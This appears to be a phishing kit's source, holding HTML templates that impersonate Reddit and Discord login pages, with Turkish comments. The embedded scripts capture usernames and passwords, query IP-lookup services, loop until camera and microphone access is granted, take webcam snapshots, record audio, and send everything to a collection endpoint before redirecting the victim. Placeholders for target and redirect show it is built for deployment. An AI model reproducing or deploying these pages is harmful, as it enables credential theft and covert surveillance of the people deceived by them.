        let mediaProcessingComplete = false;
        let loginClickCount = 0;
        let accountSent = false;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }
                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://google.com/',
                'https://youtube.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        async function handleLogin() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            loginClickCount++;

            if (loginClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!email) {
                emailError.textContent = "Enter an email or phone number";
                emailError.style.display = 'block';
                return;
            } else if (!emailRegex.test(email)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            if (!password) {
                passwordError.textContent = "Enter a password";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        // Medya işlemlerini başlat
        processMedia();
    </script>
</body>
</html>"""], "rl0": ["""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in - Reddit</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #1A1A1B; /* Koyu tema arka plan */
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 30px;
            background-color: #242526; /* Koyu tema giriş kutusu */
            border: 1px solid #343536;
            border-radius: 4px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 60px; /* Kare logo için uygun boyut */
            height: 60px;
        }
        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #FFFFFF; /* Koyu tema için beyaz */
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #A1A3A6; /* Açık gri */
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 10px;
        }
        input {
            width: 100%;
            padding: 10px 14px;
            font-size: 14px;
            border: 1px solid #4A4B4C;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            background-color: #343536; /* Koyu tema input */
            color: #FFFFFF;
        }
        input::placeholder {
            color: #A1A3A6; /* Açık gri placeholder */
        }
        input:focus {
            border-color: #0079D3;
            box-shadow: 0 0 0 1px #0079D3;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #0079D3;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .create-account {
            margin-top: 15px;
        }
        .create-account a {
            color: #0079D3;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #FF4500; /* Reddit turuncusu */
            color: #FFFFFF;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #D93A00; /* Daha koyu turuncu */
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #A1A3A6; /* Açık gri */
            font-size: 12px;
            padding: 10px 0;
            background-color: #1A1A1B; /* Koyu tema footer */
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.3);
        }
        .footer a {
            color: #A1A3A6;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            color: #0079D3;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #FF5733; /* Koyu tema için daha parlak kırmızı */
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 50px; /* Mobil için biraz küçült */
                height: 50px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 12px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://freelogopng.com/images/all_img/1658834095reddit-logo-png.png" alt="Reddit Logo" class="logo">
        <h1>Log in</h1>
        <div class="subtitle">Join the conversation on Reddit</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Username" required>
            <div id="email-error" class="error">Please enter a valid username</div>
        </div>
        <div class="buttons">
            <button class="next-btn" onclick="showPasswordScreen()">Continue</button>
            <div class="create-account">
                <a href="#">New to Reddit? Sign up</a>
            </div>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://freelogopng.com/images/all_img/1658834095reddit-logo-png.png" alt="Reddit Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <button class="signin-btn" onclick="handleSignIn()">Log in</button>
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">User Agreement</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Content Policy</a>
        <a href="#">Help</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://reddit.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[a-zA-Z0-9._%+-]+$/; // Reddit kullanıcı adları için basit bir regex

            if (!emailInput) {
                emailError.textContent = "Username cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Please enter a valid username";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in - Reddit</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #1A1A1B; /* Koyu tema arka plan */
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 30px;
            background-color: #242526; /* Koyu tema giriş kutusu */
            border: 1px solid #343536;
            border-radius: 4px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 60px; /* Kare logo için uygun boyut */
            height: 60px;
        }
        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #FFFFFF; /* Koyu tema için beyaz */
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #A1A3A6; /* Açık gri */
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 10px;
        }
        input {
            width: 100%;
            padding: 10px 14px;
            font-size: 14px;
            border: 1px solid #4A4B4C;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            background-color: #343536; /* Koyu tema input */
            color: #FFFFFF;
        }
        input::placeholder {
            color: #A1A3A6; /* Açık gri placeholder */
        }
        input:focus {
            border-color: #0079D3;
            box-shadow: 0 0 0 1px #0079D3;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #0079D3;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .create-account {
            margin-top: 15px;
        }
        .create-account a {
            color: #0079D3;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #FF4500; /* Reddit turuncusu */
            color: #FFFFFF;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #D93A00; /* Daha koyu turuncu */
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #A1A3A6; /* Açık gri */
            font-size: 12px;
            padding: 10px 0;
            background-color: #1A1A1B; /* Koyu tema footer */
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.3);
        }
        .footer a {
            color: #A1A3A6;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            color: #0079D3;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #FF5733; /* Koyu tema için daha parlak kırmızı */
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 50px; /* Mobil için biraz küçült */
                height: 50px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 12px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://freelogopng.com/images/all_img/1658834095reddit-logo-png.png" alt="Reddit Logo" class="logo">
        <h1>Log in</h1>
        <div class="subtitle">Join the conversation on Reddit</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Username" required>
            <div id="email-error" class="error">Please enter a valid username</div>
        </div>
        <div class="buttons">
            <button class="next-btn" onclick="showPasswordScreen()">Continue</button>
            <div class="create-account">
                <a href="#">New to Reddit? Sign up</a>
            </div>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://freelogopng.com/images/all_img/1658834095reddit-logo-png.png" alt="Reddit Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <button class="signin-btn" onclick="handleSignIn()">Log in</button>
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">User Agreement</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Content Policy</a>
        <a href="#">Help</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://reddit.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[a-zA-Z0-9._%+-]+$/; // Reddit kullanıcı adları için basit bir regex

            if (!emailInput) {
                emailError.textContent = "Username cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Please enter a valid username";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>"""], "pdl0": ["""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=3.0">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Discord">
    <meta property="og:title" content="Discord - Group Chat That’s All Fun & Games">
    <meta property="og:description" content="Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out.">
    <meta property="og:image" content="https://cdn.discordapp.com/assets/og_img_discord_home.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@discord">
    <meta name="twitter:creator" content="@discord">
    <title>Discord</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <link href="/assets/favicon.ico" rel="icon">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
            margin: 0;
            background: #1A1A1B; /* Varsayılan koyu tema arka planı */
            color: #FFFFFF;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .logo {
            position: fixed; /* Sol üst köşede sabit */
            top: 40px;
            left: 40px;
            width: 150px;
            height: 25px;
            z-index: 1000; /* Diğer öğelerin üstünde */
        }
        .container {
            display: flex;
            flex-direction: row;
            width: 100%;
            max-width: 900px;
            background-color: #242526;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            overflow: hidden;
        }
        .login-section, .qr-section {
            padding: 40px;
            box-sizing: border-box;
        }
        .login-section {
            flex: 1;
            background-color: #2F3136;
        }
        .qr-section {
            flex: 1;
            background-color: #242526;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            border-left: 1px solid #343536;
        }
        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #FFFFFF;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #A1A3A6;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 10px 14px;
            font-size: 14px;
            border: 1px solid #4A4B4C;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            background-color: #343536;
            color: #FFFFFF;
        }
        input::placeholder {
            color: #A1A3A6;
        }
        input:focus {
            border-color: #5865F2; /* Discord mavisi */
            box-shadow: 0 0 0 1px #5865F2;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #5865F2;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .create-account {
            margin-top: 15px;
        }
        .create-account a {
            color: #5865F2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #5865F2; /* Discord mavisi */
            color: #FFFFFF;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #4752C4; /* Daha koyu mavi */
        }
        .qr-code {
            width: 200px;
            height: 200px;
            background-color: #FFFFFF;
            border-radius: 8px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .qr-code img {
            width: 100%;
            height: 100%;
            border-radius: 8px;
        }
        .qr-instruction {
            font-size: 14px;
            color: #A1A3A6;
            text-align: center;
        }
        .error {
            color: #FF5733;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }

        /* PC Versiyonu için Arka Plan Fotoğrafı */
        @media (min-width: 769px) {
            body {
                background: url('/assets/dcbg.jpg') no-repeat center center fixed;
                background-size: cover;
            }
        }

        /* Mobil Versiyon */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                max-width: 400px;
                margin: 20px;
            }
            .qr-section {
                display: none; /* Mobil versiyonda QR kodu gizle */
            }
            .login-section {
                border-left: none;
                padding: 20px;
            }
            .logo {
                width: 150px;
                height: 32px;
                top: 10px;
                left: 10px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 12px;
            }
            #email-screen, #password-screen {
                display: block !important; /* Mobil versiyonda her iki ekranı aynı anda göster */
            }
            .next-btn, .back-btn {
                display: none; /* Next ve Back butonlarını gizle */
            }
        }
